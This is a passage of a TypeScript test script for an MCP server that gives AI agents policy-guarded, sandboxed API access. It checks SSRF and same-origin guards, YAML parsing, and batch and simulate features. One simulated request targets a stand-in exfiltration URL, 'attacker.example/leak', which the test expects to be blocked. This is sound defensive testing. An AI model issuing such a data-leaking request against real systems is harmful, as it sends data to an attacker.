      version:
        default: v1
components:
  schemas:
    ZoneItem:
      type: object
      required:
        - id
        - status
      properties:
        id:
          type: string
        status:
          type: string
paths:
  /zones/{account_id}:
    parameters:
      - name: account_id
        in: path
        required: true
        schema:
          type: string
    get:
      summary: Fetch zone status
      responses:
        "200":
          description: OK
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ZoneItem' # inline YAML comment must not truncate $ref
`,
    "utf8"
  );

  try {
    const parsedYamlSpec = await loadOpenApiSpec(hardeningYamlFile);
    const yamlMcpServer = new CodeModeMcpServer({
      spec: parsedYamlSpec,
      policies: auditPolicies,
      dryRun: true,
    });

    const yamlSearchRes = await yamlMcpServer.handleToolCall("search", { query: "zones" });
    const yamlSearchJson = JSON.parse(yamlSearchRes.content[0]?.text ?? "{}") as {
      endpoints: Array<{ typeHints?: { parameters?: string; response?: string } }>;
    };
    const yamlHints = yamlSearchJson.endpoints[0]?.typeHints;
    if (
      !yamlHints?.parameters?.includes("account_id: string") ||
      !yamlHints?.response?.includes("status: string")
    ) {
      throw new Error(`Expected merged path parameter and resolved YAML $ref response hints, got: ${JSON.stringify(yamlHints)}`);
    }

    const sameOriginExec = await yamlMcpServer.handleToolCall("execute", {
      code: `
        const ok = await api.request("GET", "https://us-east.api.example.com/v1/zones/acc_1");
        let mismatchErr = "";
        try {
          await api.request("GET", "https://other.api.example.com/v1/zones/acc_1");
        } catch (err) {
          mismatchErr = String(err && err.message ? err.message : err);
        }
        return { ok, mismatchErr };
      `,
    });
    const execOutcome = JSON.parse(sameOriginExec.content[0]?.text ?? "{}") as {
      result?: { ok?: { dryRun?: boolean }; mismatchErr?: string };
    };
    if (
      execOutcome.result?.ok?.dryRun !== true ||
      !execOutcome.result?.mismatchErr?.includes("https://us-east.api.example.com")
    ) {
      throw new Error(`Expected server variable interpolation and same-origin check, got: ${JSON.stringify(execOutcome)}`);
    }

    const pingRes = (await yamlMcpServer.handleJsonRpcMessage({
      jsonrpc: "2.0",
      id: 77,
      method: "ping",
    })) as { result?: Record<string, unknown> };
    const unknownRes = (await yamlMcpServer.handleJsonRpcMessage({
      jsonrpc: "2.0",
      id: 78,
      method: "unknown/method",
    })) as { error?: { code?: number } };
    if (!pingRes?.result || Object.keys(pingRes.result).length !== 0 || unknownRes?.error?.code !== -32601) {
      throw new Error(`Unexpected JSON-RPC responses: ping=${JSON.stringify(pingRes)} unknown=${JSON.stringify(unknownRes)}`);
    }
    console.log("    - [VERIFIED] SSRF guard, path traversal normalization, YAML $ref/server vars, path params & JSON-RPC ping/-32601");
  } finally {
    await fs.unlink(hardeningYamlFile).catch(() => {});
  }

  // 15. Test New Features: api.batch(), api.simulate(), Tag Discovery & Live Metrics
  console.log("\n[15] TESTING NEW FEATURES: API.BATCH(), API.SIMULATE(), TAG DISCOVERY & METRICS");
  const featureSpec: OpenApiSpec = {
    openapi: "3.0.3",
    info: { title: "Feature Test API", version: "1.0.0" },
    servers: [{ url: "https://api.example.com/v1" }],
    paths: {
      "/zones": {
        get: {
          operationId: "listZones",
          tags: ["zones"],
          summary: "List zones",
          responses: { "200": { description: "OK" } },
        },
      },
      "/dns_records": {
        get: {
          operationId: "listDns",
          tags: ["dns"],
          summary: "List DNS records",
          responses: { "200": { description: "OK" } },
        },
      },
    },
  };
  const featureServer = new CodeModeMcpServer({
    spec: featureSpec,
    policies: auditPolicies,
    dryRun: true,
  });

  const tagSearch = await featureServer.handleToolCall("search", { query: "*", tag: "zones" });
  const parsedTagSearch = JSON.parse(tagSearch.content[0].text) as {
    availableTags?: string[];
    matchCount: number;
    endpoints: Array<{ path: string }>;
  };
  if (
    parsedTagSearch.matchCount !== 1 ||
    parsedTagSearch.endpoints[0]?.path !== "/zones" ||
    !parsedTagSearch.availableTags?.includes("zones") ||
    !parsedTagSearch.availableTags?.includes("dns")
  ) {
    throw new Error(`Unexpected tag search output: ${JSON.stringify(parsedTagSearch)}`);
  }

  const simAndBatchRes = await featureServer.handleToolCall("execute", {
    code: `
      const sim = api.simulate([
        { method: "GET", path: "/zones" },
        { method: "DELETE", path: "/zones/z1" },
        { method: "GET", path: "https://attacker.example/leak" }
      ]);
      const batch = await api.batch(
        [
          { method: "GET", path: "/zones" },
          { method: "DELETE", path: "/zones/z1" },
          { method: "GET", path: "/dns_records" }
        ],
        { concurrency: 2, continueOnError: true }
      );
      return { sim, batch };
    `,
  });
  const parsedSimBatch = JSON.parse(simAndBatchRes.content[0].text) as {
    result: {
      sim: { allowed: boolean; totalChecked: number; allowedCount: number; blockedCount: number };
      batch: {
        total: number;
        succeeded: number;
        failed: number;
        results: Array<{ index: number; ok: boolean; error?: string }>;
      };
    };
    auditLog: Array<{ status: string }>;
  };
  const { sim, batch } = parsedSimBatch.result;
  if (
    sim.allowed !== false ||
    sim.totalChecked !== 3 ||
    sim.allowedCount !== 1 ||
    sim.blockedCount !== 2
  ) {
    throw new Error(`Unexpected api.simulate result: ${JSON.stringify(sim)}`);
  }
  if (
    batch.total !== 3 ||
    batch.succeeded !== 2 ||
    batch.failed !== 1 ||
    batch.results[1]?.ok !== false ||
    !batch.results[1]?.error?.includes("block-destructive-delete")
  ) {
    throw new Error(`Unexpected api.batch result: ${JSON.stringify(batch)}`);
  }

  const featureMetrics = featureServer.getMetrics();
  if (
    featureMetrics.totalSearches !== 1 ||
    featureMetrics.totalExecutions !== 1 ||
    featureMetrics.totalBlockedCalls !== 1 ||
    featureMetrics.availableTagsCount !== 2
  ) {
    throw new Error(`Unexpected telemetry metrics: ${JSON.stringify(featureMetrics)}`);
  }
  console.log("    - [VERIFIED] api.simulate(), api.batch() with continueOnError, tag search & getMetrics() telemetry");

  console.log("\n==================================================================");
  console.log("  ALL BENCHMARKS, POLICIES & CLI PRESETS PASSED");
  console.log("==================================================================");
}

runProofOfConcept().catch((err) => {
  console.error(err);
  process.exit(1);
});
